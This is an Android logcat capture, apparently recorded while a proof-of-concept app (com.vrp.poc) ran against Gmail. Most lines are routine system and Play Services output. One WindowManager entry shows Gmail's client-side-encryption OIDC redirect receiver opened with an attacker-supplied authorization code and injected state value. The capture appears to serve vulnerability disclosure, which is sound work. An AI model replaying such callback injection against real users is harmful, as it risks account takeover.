+09-04 07:18:26.253 15172 15172 W ChimeraViewCreator: 	at android.os.Looper.loop(Looper.java:397)
+09-04 07:18:26.253 15172 15172 W ChimeraViewCreator: 	at android.app.ActivityThread.main(ActivityThread.java:9523)
+09-04 07:18:26.253 15172 15172 W ChimeraViewCreator: 	at java.lang.reflect.Method.invoke(Native Method)
+09-04 07:18:26.253 15172 15172 W ChimeraViewCreator: 	at com.android.internal.os.RuntimeInit$MethodAndArgsCaller.run(RuntimeInit.java:575)
+09-04 07:18:26.253 15172 15172 W ChimeraViewCreator: 	at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:939)
+09-04 07:18:26.253 15172 15172 W ChimeraViewCreator: Caused by: java.lang.NoSuchMethodException: com.android.internal.widget.ActionBarContextView.<init> [class android.content.Context, interface android.util.AttributeSet]
+09-04 07:18:26.253 15172 15172 W ChimeraViewCreator: 	at java.lang.Class.getConstructor0(Class.java:3387)
+09-04 07:18:26.253 15172 15172 W ChimeraViewCreator: 	at java.lang.Class.getConstructor(Class.java:2479)
+09-04 07:18:26.253 15172 15172 W ChimeraViewCreator: 	at acii.a(:com.google.android.gms@263268035@26.32.68 (260400-975269223):57)
+09-04 07:18:26.253 15172 15172 W ChimeraViewCreator: 	... 38 more
+09-04 07:18:26.253 15172 15172 E .android.gms.ui: hiddenapi: Accessing hidden method Lcom/android/internal/widget/ActionBarContextView;-><init>(Landroid/content/Context;Landroid/util/AttributeSet;)V (runtime_flags=0, domain=platform, api=max-target-r) from Lacii; (domain=app, TargetSdkVersion=37) using reflection: denied
+09-04 07:18:26.254 15172 15172 W ChimeraViewCreator: Error attempting to create  view
+09-04 07:18:26.254 15172 15172 W ChimeraViewCreator: android.view.InflateException: Binary XML file line #47: Error inflating class com.android.internal.widget.ActionBarContextView
+09-04 07:18:26.254 15172 15172 W ChimeraViewCreator: 	at acii.a(:com.google.android.gms@263268035@26.32.68 (260400-975269223):180)
+09-04 07:18:26.254 15172 15172 W ChimeraViewCreator: 	at acar.platform_onCreateView(:com.google.android.gms@263268035@26.32.68 (260400-975269223):32)
+09-04 07:18:26.254 15172 15172 W ChimeraViewCreator: 	at acnx.onCreateView(:com.google.android.gms@263268035@26.32.68 (260400-975269223):8)
+09-04 07:18:26.254 15172 15172 W ChimeraViewCreator: 	at com.google.android.chimera.android.Activity.onCreateView(:com.google.android.gms@263268035@26.32.68 (260400-975269223):6)
+09-04 07:18:26.254 15172 15172 W ChimeraViewCreator: 	at acnx.public_onCreateView(:com.google.android.gms@263268035@26.32.68 (260400-975269223):6)
+09-04 07:18:26.254 15172 15172 W ChimeraViewCreator: 	at acny.onCreateView(:com.google.android.gms@263268035@26.32.68 (260400-975269223):15)
+09-04 07:18:26.254 15172 15172 W ChimeraViewCreator: 	at android.app.Activity.onCreateView(Activity.java:8378)
+09-04 07:18:26.254 15172 15172 W ChimeraViewCreator: 	at acny.platform_onCreateView(:com.google.android.gms@263268035@26.32.68 (260400-975269223):1)
+09-04 07:18:26.254 15172 15172 W ChimeraViewCreator: 	at acar.platform_onCreateView(:com.google.android.gms@263268035@26.32.68 (260400-975269223):26)
+09-04 07:18:26.254 15172 15172 W ChimeraViewCreator: 	at acnx.onCreateView(:com.google.android.gms@263268035@26.32.68 (260400-975269223):3)
+09-04 07:18:26.254 15172 15172 W ChimeraViewCreator: 	at com.google.android.chimera.android.Activity.onCreateView(:com.google.android.gms@263268035@26.32.68 (260400-975269223):1)
+09-04 07:18:26.254 15172 15172 W ChimeraViewCreator: 	at acnx.public_onCreateView(:com.google.android.gms@263268035@26.32.68 (260400-975269223):1)
+09-04 07:18:26.254 15172 15172 W ChimeraViewCreator: 	at acny.onCreateView(:com.google.android.gms@263268035@26.32.68 (260400-975269223):5)
+09-04 07:18:26.254 15172 15172 W ChimeraViewCreator: 	at android.view.LayoutInflater.tryCreateView(LayoutInflater.java:958)
+09-04 07:18:26.254 15172 15172 W ChimeraViewCreator: 	at android.view.LayoutInflater.createViewFromTag(LayoutInflater.java:886)
+09-04 07:18:26.254 15172 15172 W ChimeraViewCreator: 	at android.view.LayoutInflater.createViewFromTag(LayoutInflater.java:850)
+09-04 07:18:26.254 15172 15172 W ChimeraViewCreator: 	at android.view.LayoutInflater.rInflate(LayoutInflater.java:1012)
+09-04 07:18:26.254 15172 15172 W ChimeraViewCreator: 	at android.view.LayoutInflater.rInflateChildren(LayoutInflater.java:973)
+09-04 07:18:26.254 15172 15172 W ChimeraViewCreator: 	at android.view.LayoutInflater.rInflate(LayoutInflater.java:1016)
+09-04 07:18:26.254 15172 15172 W ChimeraViewCreator: 	at android.view.LayoutInflater.rInflateChildren(LayoutInflater.java:973)
+09-04 07:18:26.254 15172 15172 W ChimeraViewCreator: 	at android.view.LayoutInflater.inflate(LayoutInflater.java:571)
+09-04 07:18:26.254 15172 15172 W ChimeraViewCreator: 	at android.view.LayoutInflater.inflate(LayoutInflater.java:462)
+09-04 07:18:26.254 15172 15172 W ChimeraViewCreator: 	at android.view.LayoutInflater.inflate(LayoutInflater.java:413)
+09-04 07:18:26.254 15172 15172 W ChimeraViewCreator: 	at com.android.internal.policy.DecorView.onResourcesLoaded(DecorView.java:1814)
+09-04 07:18:26.254 15172 15172 W ChimeraViewCreator: 	at com.android.internal.policy.PhoneWindow.generateLayout(PhoneWindow.java:2871)
+09-04 07:18:26.254 15172 15172 W ChimeraViewCreator: 	at com.android.internal.policy.PhoneWindow.installDecor(PhoneWindow.java:2934)
+09-04 07:18:26.254 15172 15172 W ChimeraViewCreator: 	at com.android.internal.policy.PhoneWindow.getDecorView(PhoneWindow.java:2267)
+09-04 07:18:26.254 15172 15172 W ChimeraViewCreator: 	at android.app.ActivityTransitionState.setEnterSceneTransitionInfo(ActivityTransitionState.java:175)
+09-04 07:18:26.254 15172 15172 W ChimeraViewCreator: 	at android.app.Activity.performCreate(Activity.java:9350)
+09-04 07:18:26.254 15172 15172 W ChimeraViewCreator: 	at android.app.Activity.performCreate(Activity.java:9318)
+09-04 07:18:26.254 15172 15172 W ChimeraViewCreator: 	at android.app.Instrumentation.callActivityOnCreate(Instrumentation.java:1543)
+09-04 07:18:26.254 15172 15172 W ChimeraViewCreator: 	at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:4559)
+09-04 07:18:26.254 15172 15172 W ChimeraViewCreator: 	at android.app.ActivityThread.handleLaunchActivity(ActivityThread.java:4781)
+09-04 07:18:26.254 15172 15172 W ChimeraViewCreator: 	at android.app.servertransaction.LaunchActivityItem.execute(LaunchActivityItem.java:224)
+09-04 07:18:26.254 15172 15172 W ChimeraViewCreator: 	at android.app.servertransaction.TransactionExecutor.executeNonLifecycleItem(TransactionExecutor.java:133)
+09-04 07:18:26.254 15172 15172 W ChimeraViewCreator: 	at android.app.servertransaction.TransactionExecutor.executeTransactionItems(TransactionExecutor.java:103)
+09-04 07:18:26.254 15172 15172 W ChimeraViewCreator: 	at android.app.servertransaction.TransactionExecutor.execute(TransactionExecutor.java:80)
+09-04 07:18:26.254 15172 15172 W ChimeraViewCreator: 	at android.app.ActivityThread$H.handleMessage(ActivityThread.java:3032)
+09-04 07:18:26.254 15172 15172 W ChimeraViewCreator: 	at android.os.Handler.dispatchMessageImpl(Handler.java:142)
+09-04 07:18:26.254 15172 15172 W ChimeraViewCreator: 	at android.os.Handler.dispatchMessage(Handler.java:125)
+09-04 07:18:26.254 15172 15172 W ChimeraViewCreator: 	at android.os.Looper.loopOnce(Looper.java:296)
+09-04 07:18:26.254 15172 15172 W ChimeraViewCreator: 	at android.os.Looper.loop(Looper.java:397)
+09-04 07:18:26.254 15172 15172 W ChimeraViewCreator: 	at android.app.ActivityThread.main(ActivityThread.java:9523)
+09-04 07:18:26.254 15172 15172 W ChimeraViewCreator: 	at java.lang.reflect.Method.invoke(Native Method)
+09-04 07:18:26.254 15172 15172 W ChimeraViewCreator: 	at com.android.internal.os.RuntimeInit$MethodAndArgsCaller.run(RuntimeInit.java:575)
+09-04 07:18:26.254 15172 15172 W ChimeraViewCreator: 	at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:939)
+09-04 07:18:26.254 15172 15172 W ChimeraViewCreator: Caused by: java.lang.NoSuchMethodException: com.android.internal.widget.ActionBarContextView.<init> [class android.content.Context, interface android.util.AttributeSet]
+09-04 07:18:26.254 15172 15172 W ChimeraViewCreator: 	at java.lang.Class.getConstructor0(Class.java:3387)
+09-04 07:18:26.254 15172 15172 W ChimeraViewCreator: 	at java.lang.Class.getConstructor(Class.java:2479)
+09-04 07:18:26.254 15172 15172 W ChimeraViewCreator: 	at acii.a(:com.google.android.gms@263268035@26.32.68 (260400-975269223):57)
+09-04 07:18:26.254 15172 15172 W ChimeraViewCreator: 	... 45 more
+09-04 07:18:26.259  1431  2328 D CorePackageUpdate: Couldn't find a persistent state for task= 60
+09-04 07:18:26.260  1431  2328 D CorePackageUpdate: Couldn't find a persistent state for task= 58
+09-04 07:18:26.261  1431  2328 D ActivityManager: quick sync unfreeze 8828 for 1
+09-04 07:18:26.261  1000  3336 D AudioFlinger: onStateChanged: pid:8828  uid:10134  state:unfrozen - no freeze activity
+09-04 07:18:26.262  1431  2328 D CorePackageUpdate: Couldn't find a persistent state for task= 58
+09-04 07:18:26.262  1431  1489 D ActivityManager: sync unfroze 8828 com.android.vending for 1
+09-04 07:18:26.262  1431  1489 D ActivityManager: sync unfroze 9157 com.android.vending:quick_launch for 1
+09-04 07:18:26.263  1431  1489 D ActivityManager: sync unfroze 5344 com.google.android.adservices.api for 1
+09-04 07:18:26.263  1431  2328 D CorePackageUpdate: Couldn't find a persistent state for task= 58
+09-04 07:18:26.263  1431  1489 D ActivityManager: sync unfroze 8841 com.android.vending:background for 1
+09-04 07:18:26.263  1431  2328 D CorePackageUpdate: Couldn't find a persistent state for task= 58
+09-04 07:18:26.264  1431  2328 D CorePackageUpdate: Couldn't find a persistent state for task= 58
+09-04 07:18:26.264  1431  1489 D ActivityManager: sync unfroze 15879 com.google.android.webview:sandboxed_process0:org.chromium.content.app.SandboxedProcessService0:0 for 1
+09-04 07:18:26.264  1431  2328 D ActivityManager: quick sync unfreeze 12952 for 1
+09-04 07:18:26.270  9157  9171 I Finsky:quick_launch: [37] Stats for Executor: bgExecutor xuh@2548012[Running, pool size = 4, active threads = 0, queued tasks = 0, completed tasks = 16]
+09-04 07:18:26.270  9157  9171 I Finsky:quick_launch: [37] Stats for Executor: LightweightExecutor xuh@772a836[Running, pool size = 4, active threads = 0, queued tasks = 0, completed tasks = 25]
+09-04 07:18:26.279  1431  1489 D ActivityManager: sync unfroze 12952 com.google.android.gm for 1
+09-04 07:18:26.279 11094 11094 D BoundBrokerSvc: onUnbind: Intent { act=com.google.android.gms.measurement.START xflg=0x4 pkg=com.google.android.gms }
+09-04 07:18:26.283 15172 15172 I StartAndroidAppRedirect: Ignoring unexpected finish redirect intent
+09-04 07:18:26.286 15172 15172 W GmsActivityProxy: Error binding root VE. StartAndroidAppRedirectProxyActivity is missing a @GmsCoreVeId annotation. [CONTEXT service_id=264 ]
+09-04 07:18:26.289 15172 15172 W ChimeraProxyRslvr: No registered Chimera impl for com.google.android.gms.kids.SettingsActivity
+09-04 07:18:26.289 15172 15172 E AbstractGmsTracer: Traced class shouldn't be obfuscated: achg [CONTEXT service_id=259 ]
+09-04 07:18:26.291 15172 15172 W ChimeraUtils: Unexpected module id prefix: 
+09-04 07:18:26.291 15172 15172 W ChimeraUtils: Empty module id ignored
+09-04 07:18:26.292 15172 15172 W GmsActivityProxy: Error binding root VE. SettingsActivity is missing a @GmsCoreVeId annotation. [CONTEXT service_id=264 ]
+09-04 07:18:26.294 15172 15172 I ContentCaptureHelper: Setting logging level to OFF
+09-04 07:18:26.296  1431  1489 W ProcessStats: Tracking association SourceState{ce9a5 com.android.vending/10134 BTop #46831} whose proc state 2 is better than process ProcessState{f4df17a com.android.vending:quick_launch/10134 pkg=com.android.vending} proc state 14 (10 skipped)
+09-04 07:18:26.304  8828  8828 W Finsky  : [2] No LoggingContext in the bundle, which breaks event chain!. Creating a new logging context.
+09-04 07:18:26.312  1000  1085 I APM_AudioPolicyManager: getNewOutputDevices io 13 recent device override {AUDIO_DEVICE_OUT_SPEAKER, @:}
+09-04 07:18:26.315   926  1744 D audio_hw_waves: update_sink_info_from_usecases: update amcs, instance id 1, volume 152 0 0 0 0 0 0 0 0 0
+09-04 07:18:26.315   926  1744 W audio_hw_35l41: cs35l41_amp_common_event: ret: 0, event: 15, state: 3, device: 0
+09-04 07:18:26.315   926  1744 D audio_hw_output_stream: update stream 1 active 0 gain 0.000000
+09-04 07:18:26.317  2052  2074 V RecentTasksController: Notify recent tasks changed
+09-04 07:18:26.317 14762 14762 D RecentTasksList: invalidateLoadedTasks - previous requestLoadId: -1
+09-04 07:18:26.321 12952 16724 W ogle.android.gm: Monitor::Inflate: Install failed 0x21a2548
+09-04 07:18:26.322  8828  8828 E Finsky  : [2] PITH: incorrect referrer URI null
+09-04 07:18:26.329 14762 14762 D RecentsView: onTaskDisplayChanged: 61, new displayId = 0
+09-04 07:18:26.331  1431  6903 D CorePackageUpdate: onRecentTaskRemoved Removing task: 14
+09-04 07:18:26.332  1431  6903 D CorePackageUpdate: Couldn't find a persistent state for task= 14
+09-04 07:18:26.332  2052  2074 V RecentTasksController: Notify recent tasks changed
+09-04 07:18:26.332  2052  2074 V RecentTasksController: Notify recent tasks changed
+09-04 07:18:26.332 14762 14762 D RecentTasksList: invalidateLoadedTasks - previous requestLoadId: -1
+09-04 07:18:26.332 14762 14762 D RecentTasksList: invalidateLoadedTasks - previous requestLoadId: -1
+09-04 07:18:26.332  1431  6903 V ActivityTaskManager: TaskLaunchParamsModifier: phase=3 task=Task{f077b21 #61 type=standard A=10134:com.android.vending} activity=ActivityRecord{21726600 u0 com.android.vending/com.google.android.finsky.activities.MainActivityPrivate t-1} display-area-from-source=DefaultTaskDisplayArea@42689679 display-id=0 task-display-area-windowing-mode=1 suggested-display-area=DefaultTaskDisplayArea@42689679 inherit-from-source=fullscreen non-freeform-task-display-area display-area=DefaultTaskDisplayArea@42689679 default-portrait freeform-size-mismatch=Rect(276, 694 - 804, 1774)
+09-04 07:18:26.332  1431  6903 I ActivityTaskManager: START u0 {act=android.intent.action.VIEW dat=http://market.android.com/... xflg=0x4 cmp=com.android.vending/com.google.android.finsky.activities.MainActivityPrivate (has extras)} with LAUNCH_SINGLE_TASK from uid 10134 (com.android.vending) (sr=177161137) (BAL_ALLOW_VISIBLE_WINDOW) result code=0
+09-04 07:18:26.339  1431  6903 D CorePackageUpdate: Couldn't find a persistent state for task= 61
+09-04 07:18:26.342  1431  8109 W InputChannel-JNI: Channel already disposed.
+09-04 07:18:26.348  8828  8828 I Finsky  : [2] Set up MAUI
+09-04 07:18:26.351  1431  6903 D WindowManager: setClientSurface Surface(name=VRI-Splash Screen com.android.vending#1612)/@0xbd36d59 for e9a16a3 Splash Screen com.android.vending
+09-04 07:18:26.352  2052  2083 I Surface : Creating surface for consumer unnamed-2052-180 with slotExpansion=1 for 64 slots
+09-04 07:18:26.352  2052  2083 I Surface : Creating surface for consumer VRI[vending]#172(BLAST Consumer)172 with slotExpansion=1 for 64 slots
+09-04 07:18:26.354  8828  8857 I Finsky  : [37] Verifying app locale consistency (current locale = English (United States))
+09-04 07:18:26.354  8828  8857 I Finsky  : [37] Language Split Installed = true
+09-04 07:18:26.355  8828  8857 I Finsky  : [37] Has Inconsistent Persistent Cache = false (cache has locale(s) = [en-US])
+09-04 07:18:26.355  8828  8857 I Finsky  : [37] Has Inconsistent Memory Cache = false (initial locale = English (United States))
+09-04 07:18:26.356  8828 16648 I Finsky  : [395] SCH: Canceling job 16-16161616
+09-04 07:18:26.356  8828 16648 I Finsky  : [395] WM::SCH: Logging work end for 16-16161616
+09-04 07:18:26.357  8828  8872 I Finsky  : [51] SCH: Scheduling phonesky job Id: 26-1414141414, CT: 1788481520801, Constraints: [{ L: 21825782, D: 22725782, C: CHARGING_NONE, I: IDLE_NONE, N: NET_NONE, B: BATTERY_ANY }]
+09-04 07:18:26.362  8828  8873 I Finsky  : [52] SCH: Scheduling 1 system job(s)
+09-04 07:18:26.362  8828  8873 W JobInfo : Job 'com.android.vending/com.google.android.finsky.scheduler.process.mainimpl.PhoneskyJobServiceMain#9747' has a deadline with no functional constraints. The deadline won't improve job execution latency. Consider removing the deadline.
+09-04 07:18:26.362  8828  8873 I Finsky  : [52] SCH: Scheduling system job Id: 9747, L: 16840221, D: 17740221, C: false, I: false, N: 0
+09-04 07:18:26.362  2052 10214 V WindowManagerShell: onTransitionReady(transaction=6146098212906)
+09-04 07:18:26.362  2052  2074 V WindowManagerShell: onTransitionReady (#207) android.os.BinderProxy@9eee684: {id=207 t=OPEN f=0x0 trk=0 r=[0@Point(0, 0)] c=[
+09-04 07:18:26.362  2052  2074 V WindowManagerShell:         {m=OPEN f=MOVE_TO_TOP|FLAG_CHANGED_INTERACTIVE leash=Surface(name=Task=61#1609)/@0x948ec20 sb=Rect(0, 0 - 1080, 2400) eb=Rect(0, 0 - 1080, 2400) epz=Point(1080, 2400) d=0 taskParent=-1 winMode=1 userId=0},
+09-04 07:18:26.362  2052  2074 V WindowManagerShell:         {m=TO_BACK f=FLAG_CHANGED_INTERACTIVE leash=Surface(name=Task=58#1583)/@0xcbe79d9 sb=Rect(0, 0 - 1080, 2400) eb=Rect(0, 0 - 1080, 2400) epz=Point(1080, 2400) d=0 taskParent=-1 winMode=1 userId=0}
+09-04 07:18:26.362  2052  2074 V WindowManagerShell:     ]}
+09-04 07:18:26.362  1431  4218 W JobInfo : Job 'com.android.vending/com.google.android.finsky.scheduler.process.mainimpl.PhoneskyJobServiceMain#9747' has a deadline with no functional constraints. The deadline won't improve job execution latency. Consider removing the deadline.
+09-04 07:18:26.362  2052  2074 V WindowManagerShell: Playing animation for (#207) android.os.BinderProxy@9eee684@0
+09-04 07:18:26.362  2052  2074 D ShellSplitScreen: startAnimation: transition=207 isSplitActive=false
+09-04 07:18:26.362  2052  2074 V ShellRecents: RecentsTransitionHandler.startAnimation: no controller found
+09-04 07:18:26.362  2052  2074 V WindowManagerShell: Transition doesn't have explicit remote, search filters for match for {id=207 t=OPEN f=0x0 trk=0 r=[0@Point(0, 0)] c=[{m=OPEN f=MOVE_TO_TOP|FLAG_CHANGED_INTERACTIVE leash=Surface(name=Task=61#1609)/@0x948ec20 sb=Rect(0, 0 - 1080, 2400) eb=Rect(0, 0 - 1080, 2400) epz=Point(1080, 2400) d=0 taskParent=-1 winMode=1 userId=0},{m=TO_BACK f=FLAG_CHANGED_INTERACTIVE leash=Surface(name=Task=58#1583)/@0xcbe79d9 sb=Rect(0, 0 - 1080, 2400) eb=Rect(0, 0 - 1080, 2400) epz=Point(1080, 2400) d=0 taskParent=-1 winMode=1 userId=0}]}
+09-04 07:18:26.362  2052  2074 V WindowManagerShell:  Checking filter Pair{{types=[] flags=0x0 notFlags=0x0 checks=[{atype=undefined independent=true modes=[CLOSE,TO_BACK] flags=IN_TASK_WITH_EMBEDDED_ACTIVITY mustBeTask=false order=ANY topActivity=null launchCookie=null taskFragmentToken=android.os.BinderProxy@cb7dc2b windowingMode=undefined isCrossDisplayMove=false}]} RemoteTransition { remoteTransition = android.window.IRemoteTransition$Stub$Proxy@3a00888, appThread = android.app.IApplicationThread$Stub$Proxy@eed4221, debugName = overlayBackTransition, filter = {types=[] flags=0x0 notFlags=0x0 checks=[{atype=undefined independent=true modes=[CLOSE,TO_BACK] flags=IN_TASK_WITH_EMBEDDED_ACTIVITY mustBeTask=false order=ANY topActivity=null launchCookie=null taskFragmentToken=android.os.BinderProxy@cb7dc2b windowingMode=undefined isCrossDisplayMove=false}]} }}
+09-04 07:18:26.362  2052  2074 V WindowManagerShell:  Checking filter Pair{{types=[] flags=0x0 notFlags=0x0 checks=[{atype=dream independent=true modes=[OPEN,TO_FRONT] flags=NONE mustBeTask=false order=ANY topActivity=null launchCookie=null windowingMode=undefined isCrossDisplayMove=false},{atype=home independent=true modes=[CLOSE,TO_BACK] flags=NONE mustBeTask=false order=ANY topActivity=null launchCookie=null windowingMode=undefined isCrossDisplayMove=false}]} RemoteTransition { remoteTransition = android.window.IRemoteTransition$Stub$Proxy@bb16646, appThread = android.app.IApplicationThread$Stub$Proxy@7d61007, debugName = LauncherToDream, filter = {types=[] flags=0x0 notFlags=0x0 checks=[{atype=dream independent=true modes=[OPEN,TO_FRONT] flags=NONE mustBeTask=false order=ANY topActivity=null launchCookie=null windowingMode=undefined isCrossDisplayMove=false},{atype=home independent=true modes=[CLOSE,TO_BACK] flags=NONE mustBeTask=false order=ANY topActivity=null launchCookie=null windowingMode=undefined isCrossDisplayMove=false}]} }}
+09-04 07:18:26.362  2052  2074 V WindowManagerShell:  Checking filter Pair{{types=[] flags=0x0 notFlags=0x0 checks=[{atype=standard independent=false modes=[CHANGE] flags=NONE mustBeTask=true order=ANY topActivity=null launchCookie=null windowingMode=undefined isCrossDisplayMove=true}]} RemoteTransition { remoteTransition = android.window.IRemoteTransition$Stub$Proxy@b712534, appThread = android.app.IApplicationThread$Stub$Proxy@2badf5d, debugName = QuickstepDisplayMove, filter = {types=[] flags=0x0 notFlags=0x0 checks=[{atype=standard independent=false modes=[CHANGE] flags=NONE mustBeTask=true order=ANY topActivity=null launchCookie=null windowingMode=undefined isCrossDisplayMove=true}]} }}
+09-04 07:18:26.362  2052  2074 V WindowManagerShell:  Checking filter Pair{{types=[] flags=0x0 notFlags=0x100 checks=[{atype=home independent=true modes=[OPEN,TO_FRONT] flags=NONE mustBeTask=false order=ANY topActivity=ComponentInfo{com.google.android.apps.nexuslauncher/com.google.android.apps.nexuslauncher.NexusLauncherActivity} launchCookie=null windowingMode=undefined isCrossDisplayMove=false},{atype=standard independent=true modes=[CLOSE,TO_BACK] flags=NONE mustBeTask=false order=ANY topActivity=null launchCookie=null windowingMode=undefined isCrossDisplayMove=false},{NOT atype=undefined independent=true modes=[] flags=NONE mustBeTask=true order=ANY topActivity=null launchCookie=null customAnim=true windowingMode=undefined isCrossDisplayMove=false}]} RemoteTransition { remoteTransition = android.window.IRemoteTransition$Stub$Proxy@88da0d2, appThread = android.app.IApplicationThread$Stub$Proxy@fb9a5a3, debugName = QuickstepLaunchHome, filter = {types=[] flags=0x0 notFlags=0x100 checks=[{atype=home independent=true modes=[OPEN,TO_FRONT] flags=NONE mustBeTask=false order=ANY topActivity=ComponentInfo{com.google.android.apps.nexuslauncher/com.google.android.apps.nexuslauncher.NexusLauncherActivity} launchCookie=null windowingMode=undefined isCrossDisplayMove=false},{atype=standard independent=true modes=[CLOSE,TO_BACK] flags=NONE mustBeTask=false order=ANY topActivity=null launchCookie=null windowingMode=undefined isCrossDisplayMove=false},{NOT atype=undefined independent=true modes=[] flags=NONE mustBeTask=true order=ANY topActivity=null launchCookie=null customAnim=true windowingMode=undefined isCrossDisplayMove=false}]} }}
+09-04 07:18:26.362  2052  2074 V WindowManagerShell:  Delegate animation for (#207) to null
+09-04 07:18:26.362  2052  2074 V WindowManagerShell: start default transition animation, info = {id=207 t=OPEN f=0x0 trk=0 r=[0@Point(0, 0)] c=[{m=OPEN f=MOVE_TO_TOP|FLAG_CHANGED_INTERACTIVE leash=Surface(name=Task=61#1609)/@0x948ec20 sb=Rect(0, 0 - 1080, 2400) eb=Rect(0, 0 - 1080, 2400) epz=Point(1080, 2400) d=0 taskParent=-1 winMode=1 userId=0},{m=TO_BACK f=FLAG_CHANGED_INTERACTIVE leash=Surface(name=Task=58#1583)/@0xcbe79d9 sb=Rect(0, 0 - 1080, 2400) eb=Rect(0, 0 - 1080, 2400) epz=Point(1080, 2400) d=0 taskParent=-1 winMode=1 userId=0}]}
+09-04 07:18:26.363  2052  2074 V WindowManagerShell: loadAnimation: anim=android.view.animation.AnimationSet@693da95 animAttr=0x9 type=OPEN isEntrance=false
+09-04 07:18:26.364 11094 11094 D BoundBrokerSvc: onBind: Intent { act=com.google.android.gms.measurement.START xflg=0x4 pkg=com.google.android.gms }
+09-04 07:18:26.364 11094 11094 D BoundBrokerSvc: Loading bound service for intent: Intent { act=com.google.android.gms.measurement.START xflg=0x4 pkg=com.google.android.gms }
+09-04 07:18:26.368  1431  1486 V WindowManager: Sent Transition (#207) createdAt=09-04 07:18:26.151 via request=TransitionRequestInfo { type = OPEN, triggerTask = TaskInfo{userId=0 taskId=58 effectiveUid=10355 displayId=0 isRunning=true baseIntent=Intent { flg=0x10000000 cmp=com.vrp.poc/.MainActivity } baseActivity=ComponentInfo{com.vrp.poc/com.vrp.poc.MainActivity} topActivity=ComponentInfo{com.google.android.gm/com.google.apps.security.cse.xplat.identity.oidc.appauth.android.CseRedirectUriReceiverActivity} origActivity=null realActivity=ComponentInfo{com.vrp.poc/com.vrp.poc.MainActivity} realActivityIsAppLockEnabled=false numActivities=2 lastActiveTime=26601143 supportsMultiWindow=true supportsMultiWindowWithoutConstraints=true resizeMode=1 isResizeable=true minWidth=-1 minHeight=-1 defaultMinSize=220 token=WCT{RemoteToken{fbc6419 Task{927dffb #58 type=standard A=10355:com.vrp.poc}}} topActivityType=1 pictureInPictureParams=null shouldDockBigOverlays=false launchIntoPipHostTaskId=-1 lastParentTaskIdBeforePip=-1 displayCutoutSafeInsets=Rect(0, 0 - 0, 0) topActivityInfo=ActivityInfo{8b2b782 com.google.apps.security.cse.xplat.identity.oidc.appauth.android.CseRedirectUriReceiverActivity} launchCookies=[] positionInParent=Point(0, 0) parentTaskId=-1 isFocused=true isInteractive=true isVisible=true isVisibleRequested=true isTopActivityNoDisplay=false isSleeping=false locusId=null displayAreaFeatureId=1 isTopActivityTransparent=false isActivityStackTransparent=false lastNonFullscreenBounds=Rect(276, 694 - 804, 1774) leafTaskBoundsFromOptions= false capturedLink=https://client-side-encryption.google.com/oidc/gmail/native/callback?code=4/ATTACKER_AUTH_CODE&state=INJECTED_STATE capturedLinkTimestamp=0 requestedVisibleTypes=503 topActivityRequestOpenInBrowserEducationTimestamp=0 appCompatTaskInfo=AppCompatTaskInfo { topActivityInSizeCompat=false isLeafTask= true eligibleForLetterboxEducation= false isLetterboxEducationEnabled= false isLetterboxDoubleTapEnabled= false eligibleForUserAspectRatioButton= false topActivityBoundsLetterboxed= false isFromLetterboxDoubleTap= false topActivityLetterboxVerticalPosition= -1 topActivityLetterboxHorizontalPosition= -1 topActivityLetterboxWidth=-1 topActivityLetterboxHeight=-1 topActivityAppBounds=Rect(0, 0 - 1080, 2400) isUserFullscreenOverrideEnabled=false isSystemFullscreenOverrideEnabled=false hasMinAspectRatioOverride=false topActivityLetterboxBounds=null topNonResizableActivityAspectRatio=-1.0} topActivityMainWindowFrame=null isAppBubble=false}, pipChange = null, remoteTransitionInfo = null, displayChanges = null, requestedLocation = null, userChange = null, windowingLayerChange = null, fullscreenRequestChange = null, flags = 0, debugId = 207 }
+09-04 07:18:26.368  1431  1486 V WindowManager:     startWCT=WindowContainerTransaction { changes= {} hops= [] flags= 0 errorCallbackToken=null taskFragmentOrganizer=null }
+09-04 07:18:26.368  1431  1486 V WindowManager:     info={id=207 t=OPEN f=0x0 trk=0 r=[0@Point(0, 0)] c=[
+09-04 07:18:26.368  1431  1486 V WindowManager:         {WCT{RemoteToken{88dee93 Task{f077b21 #61 type=standard A=10134:com.android.vending}}} m=OPEN f=MOVE_TO_TOP|FLAG_CHANGED_INTERACTIVE leash=Surface(name=Task=61#1609)/@0x1ad79ff sb=Rect(0, 0 - 1080, 2400) eb=Rect(0, 0 - 1080, 2400) epz=Point(1080, 2400) d=0 taskParent=-1 winMode=1 userId=0},
+09-04 07:18:26.368  1431  1486 V WindowManager:         {WCT{RemoteToken{fbc6419 Task{927dffb #58 type=standard A=10355:com.vrp.poc}}} m=TO_BACK f=FLAG_CHANGED_INTERACTIVE leash=Surface(name=Task=58#1583)/@0xfb0ff63 sb=Rect(0, 0 - 1080, 2400) eb=Rect(0, 0 - 1080, 2400) epz=Point(1080, 2400) d=0 taskParent=-1 winMode=1 userId=0}
+09-04 07:18:26.368  1431  1486 V WindowManager:     ]}
+09-04 07:18:26.368  1431  8109 W InputChannel-JNI: Channel already disposed.
+09-04 07:18:26.369  2052  2074 V WindowManagerShell: loadAnimation: anim=android.view.animation.AnimationSet@f35c74d animAttr=0x8 type=OPEN isEntrance=true
+09-04 07:18:26.370  2052  2074 V WindowManagerShell:  animated by com.android.wm.shell.transition.DefaultTransitionHandler@f745678
+09-04 07:18:26.371  2052  2074 V ShellTaskOrganizer: Task appeared taskId=61 listener=FullscreenTaskListener
+09-04 07:18:26.371  2052  2074 V ShellTaskOrganizer: Fullscreen Task Appeared: #61
+09-04 07:18:26.371  2052  2074 D ShellPackageUpdate: PackageUpdateController: Setting handlePackageUpdate for task: 61
+09-04 07:18:26.371  8828  8828 I Finsky  : [2] [AV::AE]: Does the account [dRTotmvjb-BuoID67W1ioJVlCYD37Ix4E1XyvO2JjLs] have a permanently ineligible reason? false
+09-04 07:18:26.371  8828  8828 I Finsky  : [2] AV::Onboarding eligible blocking [dRTotmvjb-BuoID67W1ioJVlCYD37Ix4E1XyvO2JjLs], false
+09-04 07:18:26.371  8828  8828 I Finsky  : [2] MAIHI: AV::Onboarding check result - [dRTotmvjb-BuoID67W1ioJVlCYD37Ix4E1XyvO2JjLs], false
+09-04 07:18:26.373  1431  6903 V GrammaticalInflectionUtils: AttributionSource: android.content.AttributionSource@1364511b does not have READ_SYSTEM_GRAMMATICAL_GENDER permission.
+09-04 07:18:26.376 14762 14762 D RecentsView: onTaskDisplayChanged: 62, new displayId = 0
+09-04 07:18:26.377   545  1548 I libbinder.BpBinder: onLastStrongRef automatically unlinking death recipients for binder (0xb40000787bea2040) with descriptor: '(not cached)'
